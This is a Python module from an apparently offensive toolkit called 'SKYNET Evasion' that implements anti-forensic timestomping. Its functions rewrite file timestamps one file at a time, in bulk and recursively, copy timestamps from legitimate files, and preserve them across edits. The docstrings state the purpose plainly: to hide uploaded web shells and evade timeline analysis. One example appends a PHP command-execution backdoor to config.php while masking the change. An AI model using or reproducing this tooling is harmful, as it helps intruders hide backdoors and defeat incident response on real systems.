"""
SKYNET Evasion - Timestomping and File Manipulation

Timestamp manipulation to hide file modifications.

Clearance Level: Alpha-Black (Anti-Forensic Operations Authority)
Specialization: File timestamp manipulation and hiding modifications
Mission: Cover temporal traces of SKYNET operations

This module provides:
- MAC time manipulation (Modified, Accessed, Created)
- Timestamp matching to other files
- Bulk timestomping operations
- Timestamp restoration
"""

import os
import shutil
import subprocess
import time
from datetime import datetime
from typing import Any, Dict, List, Optional


def stomp_file_timestamps(
    file_path: str,
    timestamp: Optional[float] = None,
    modified_time: Optional[float] = None,
    accessed_time: Optional[float] = None,
    created_time: Optional[float] = None,
    birth_time: Optional[float] = None,
) -> Dict[str, Any]:
    """
    Modify file timestamps (timestomping).

    MAC Times:
    - M = Modified time (content changed)
    - A = Accessed time (file opened/read)
    - C = Created time (inode changed on Linux, creation on Windows)
    - B = Birth time (creation time - Windows only)

    Args:
        file_path: Path to file to modify
        timestamp: Set all times to this value (epoch time)
        modified_time: Specific modified time
        accessed_time: Specific accessed time
        created_time: Specific created time (Windows birth time)
        birth_time: Birth time (Windows only)

    Returns:
        Dictionary containing:
        - original_times: Original MAC times
        - new_times: New MAC times
        - success: Whether operation succeeded

    Example:
        >>> # Set all timestamps to specific date
        >>> from datetime import datetime
        >>> target_date = datetime(2020, 1, 1, 12, 0, 0).timestamp()
        >>> result = stomp_file_timestamps(
        ...     file_path="/var/www/html/shell.php",
        ...     timestamp=target_date
        ... )

        >>> # Set specific times
        >>> result = stomp_file_timestamps(
        ...     file_path="/tmp/exploit.elf",
        ...     modified_time=target_date,
        ...     accessed_time=target_date
        ... )

    Use Cases:
        - Hide when web shell was uploaded
        - Make malicious file appear old
        - Match timestamps to legitimate files
        - Evade timeline analysis
    """
    results = {"original_times": {}, "new_times": {}, "success": False, "error": None}

    try:
        if not os.path.exists(file_path):
            results["error"] = f"File not found: {file_path}"
            return results

        # Get original timestamps
        stat_info = os.stat(file_path)
        results["original_times"] = {
            "modified": stat_info.st_mtime,
            "accessed": stat_info.st_atime,
            "created": stat_info.st_ctime,
        }

        # Determine new timestamps
        if timestamp:
            # Use single timestamp for all
            new_atime = timestamp
            new_mtime = timestamp
        else:
            new_atime = accessed_time or stat_info.st_atime
            new_mtime = modified_time or stat_info.st_mtime

        # Set access and modified times
        os.utime(file_path, (new_atime, new_mtime))

        # On Windows, try to set birth time (creation time)
        if os.name == "nt" and (created_time or birth_time):
            try:
                _set_windows_birth_time(file_path, created_time or birth_time)
            except:
                pass

        # Get new timestamps
        stat_info = os.stat(file_path)
        results["new_times"] = {
            "modified": stat_info.st_mtime,
            "accessed": stat_info.st_atime,
            "created": stat_info.st_ctime,
        }

        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def match_timestamps(
    target_file: str, reference_file: str, match_all: bool = True
) -> Dict[str, Any]:
    """
    Match timestamps of target file to reference file.

    Makes target file appear to have same age as reference file.

    Args:
        target_file: File to modify (e.g., webshell)
        reference_file: File to match (e.g., index.php)
        match_all: Match all timestamps vs just modified/accessed

    Returns:
        Success status and timestamp info

    Example:
        >>> # Make webshell appear same age as index.php
        >>> result = match_timestamps(
        ...     target_file="/var/www/html/shell.php",
        ...     reference_file="/var/www/html/index.php"
        ... )
        >>>
        >>> print(f"Shell now appears from: {result['new_times']['modified']}")

    Use Cases:
        - Make uploaded webshell appear legitimate
        - Hide modified system files
        - Blend in with existing files
    """
    results = {
        "original_times": {},
        "reference_times": {},
        "new_times": {},
        "success": False,
        "error": None,
    }

    try:
        if not os.path.exists(target_file):
            results["error"] = f"Target file not found: {target_file}"
            return results

        if not os.path.exists(reference_file):
            results["error"] = f"Reference file not found: {reference_file}"
            return results

        # Get reference file timestamps
        ref_stat = os.stat(reference_file)
        results["reference_times"] = {
            "modified": ref_stat.st_mtime,
            "accessed": ref_stat.st_atime,
            "created": ref_stat.st_ctime,
        }

        # Get original target timestamps
        target_stat = os.stat(target_file)
        results["original_times"] = {
            "modified": target_stat.st_mtime,
            "accessed": target_stat.st_atime,
            "created": target_stat.st_ctime,
        }

        # Copy timestamps from reference to target
        shutil.copystat(reference_file, target_file)

        # Get new timestamps
        target_stat = os.stat(target_file)
        results["new_times"] = {
            "modified": target_stat.st_mtime,
            "accessed": target_stat.st_atime,
            "created": target_stat.st_ctime,
        }

        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def bulk_timestomp(
    directory: str, timestamp: float, file_pattern: str = "*", recursive: bool = False
) -> Dict[str, Any]:
    """
    Timestomp multiple files in directory.

    Args:
        directory: Directory containing files
        timestamp: Timestamp to apply to all files
        file_pattern: Glob pattern for files (e.g., "*.php")
        recursive: Process subdirectories

    Returns:
        Dictionary with files modified

    Example:
        >>> # Stomp all PHP files in web directory
        >>> from datetime import datetime
        >>> old_time = datetime(2019, 1, 1).timestamp()
        >>> result = bulk_timestomp(
        ...     directory="/var/www/html",
        ...     timestamp=old_time,
        ...     file_pattern="*.php",
        ...     recursive=True
        ... )
        >>>
        >>> print(f"Timestomped {result['files_modified']} files")
    """
    results = {"files_modified": 0, "files_list": [], "success": False, "error": None}

    try:
        import glob

        # Build search pattern
        if recursive:
            pattern = os.path.join(directory, "**", file_pattern)
            files = glob.glob(pattern, recursive=True)
        else:
            pattern = os.path.join(directory, file_pattern)
            files = glob.glob(pattern)

        # Stomp each file
        for file_path in files:
            if os.path.isfile(file_path):
                try:
                    os.utime(file_path, (timestamp, timestamp))
                    results["files_modified"] += 1
                    results["files_list"].append(file_path)
                except:
                    pass

        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def restore_original_timestamps(file_path: str, backup_times: Dict[str, float]) -> Dict[str, Any]:
    """
    Restore original timestamps from backup.

    Args:
        file_path: File to restore
        backup_times: Dictionary with original times from stomp_file_timestamps()

    Returns:
        Success status

    Example:
        >>> # Save original times before stomping
        >>> result = stomp_file_timestamps("/tmp/file.txt", timestamp=123456)
        >>> original = result['original_times']
        >>>
        >>> # Later, restore original times
        >>> restore_original_timestamps("/tmp/file.txt", original)
    """
    results = {"success": False, "error": None}

    try:
        if not os.path.exists(file_path):
            results["error"] = f"File not found: {file_path}"
            return results

        atime = backup_times.get("accessed", time.time())
        mtime = backup_times.get("modified", time.time())

        os.utime(file_path, (atime, mtime))

        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def hide_file_modifications(
    file_path: str, modification_function: callable, *args, **kwargs
) -> Dict[str, Any]:
    """
    Execute file modification while preserving timestamps.

    Useful wrapper that:
    1. Saves original timestamps
    2. Executes your modification
    3. Restores original timestamps

    Args:
        file_path: File to modify
        modification_function: Function that modifies the file
        *args, **kwargs: Arguments for modification function

    Returns:
        Result from modification function + timestamp info

    Example:
        >>> def add_backdoor(filepath):
        ...     with open(filepath, 'a') as f:
        ...         f.write("\\n<?php system($_GET['cmd']); ?>")
        >>>
        >>> # Add backdoor while preserving timestamps
        >>> result = hide_file_modifications(
        ...     file_path="/var/www/html/config.php",
        ...     modification_function=add_backdoor,
        ...     filepath="/var/www/html/config.php"
        ... )
        >>>
        >>> # File modified but timestamps unchanged!
    """
    results = {
        "modification_result": None,
        "timestamps_preserved": False,
        "success": False,
        "error": None,
    }

    try:
        # Save original timestamps
        stat_info = os.stat(file_path)
        original_atime = stat_info.st_atime
        original_mtime = stat_info.st_mtime

        # Execute modification
        results["modification_result"] = modification_function(*args, **kwargs)

        # Restore timestamps
        os.utime(file_path, (original_atime, original_mtime))

        results["timestamps_preserved"] = True
        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def get_file_timestamps(file_path: str) -> Dict[str, Any]:
    """
    Get all timestamps for a file in human-readable format.

    Args:
        file_path: Path to file

    Returns:
        Dictionary with all timestamp info

    Example:
        >>> times = get_file_timestamps("/var/www/html/shell.php")
        >>> print(f"Modified: {times['modified_human']}")
        >>> print(f"Accessed: {times['accessed_human']}")
        >>> print(f"Created: {times['created_human']}")
    """
    results = {
        "modified": 0,
        "accessed": 0,
        "created": 0,
        "modified_human": "",
        "accessed_human": "",
        "created_human": "",
        "success": False,
        "error": None,
    }

    try:
        if not os.path.exists(file_path):
            results["error"] = f"File not found: {file_path}"
            return results

        stat_info = os.stat(file_path)

        results["modified"] = stat_info.st_mtime
        results["accessed"] = stat_info.st_atime
        results["created"] = stat_info.st_ctime

        results["modified_human"] = datetime.fromtimestamp(stat_info.st_mtime).strftime(
            "%Y-%m-%d %H:%M:%S"
        )
        results["accessed_human"] = datetime.fromtimestamp(stat_info.st_atime).strftime(
            "%Y-%m-%d %H:%M:%S"
        )
        results["created_human"] = datetime.fromtimestamp(stat_info.st_ctime).strftime(
            "%Y-%m-%d %H:%M:%S"
        )

        # On Windows, try to get birth time
        if os.name == "nt":
            try:
                results["birth"] = stat_info.st_birthtime
                results["birth_human"] = datetime.fromtimestamp(stat_info.st_birthtime).strftime(
                    "%Y-%m-%d %H:%M:%S"
                )
            except:
                pass

        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results


def _set_windows_birth_time(file_path: str, timestamp: float):
    """Set Windows birth time (creation time)."""
    if os.name != "nt":
        return

    try:
        # Use Windows API via PowerShell
        ps_script = f"""
        $file = Get-Item "{file_path}"
        $date = [DateTime]::FromFileTime({int(timestamp * 10000000 + 116444736000000000)})
        $file.CreationTime = $date
        """

        subprocess.run(["powershell", "-Command", ps_script], capture_output=True, check=True)
    except:
        pass


def timestomp_directory_recursive(
    directory: str, target_date: str, exclude_patterns: Optional[List[str]] = None
) -> Dict[str, Any]:
    """
    Recursively timestomp entire directory tree to specific date.

    Args:
        directory: Root directory to process
        target_date: Date string (YYYY-MM-DD HH:MM:SS)
        exclude_patterns: Patterns to exclude (e.g., ["*.log", "*.tmp"])

    Returns:
        Statistics about operation

    Example:
        >>> # Make entire /var/www appear from 2019
        >>> result = timestomp_directory_recursive(
        ...     directory="/var/www/html",
        ...     target_date="2019-01-01 00:00:00",
        ...     exclude_patterns=["*.log"]
        ... )
        >>>
        >>> print(f"Modified {result['files_modified']} files")
        >>> print(f"Skipped {result['files_skipped']} files")
    """
    results = {
        "files_modified": 0,
        "files_skipped": 0,
        "directories_modified": 0,
        "success": False,
        "error": None,
    }

    try:
        # Parse target date
        target_dt = datetime.strptime(target_date, "%Y-%m-%d %H:%M:%S")
        target_timestamp = target_dt.timestamp()

        exclude_patterns = exclude_patterns or []

        # Walk directory tree
        for root, dirs, files in os.walk(directory):
            # Process directories
            for dir_name in dirs:
                dir_path = os.path.join(root, dir_name)
                try:
                    os.utime(dir_path, (target_timestamp, target_timestamp))
                    results["directories_modified"] += 1
                except:
                    pass

            # Process files
            for file_name in files:
                file_path = os.path.join(root, file_name)

                # Check exclusions
                should_skip = False
                for pattern in exclude_patterns:
                    import fnmatch

                    if fnmatch.fnmatch(file_name, pattern):
                        should_skip = True
                        break

                if should_skip:
                    results["files_skipped"] += 1
                    continue

                try:
                    os.utime(file_path, (target_timestamp, target_timestamp))
                    results["files_modified"] += 1
                except:
                    results["files_skipped"] += 1

        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results
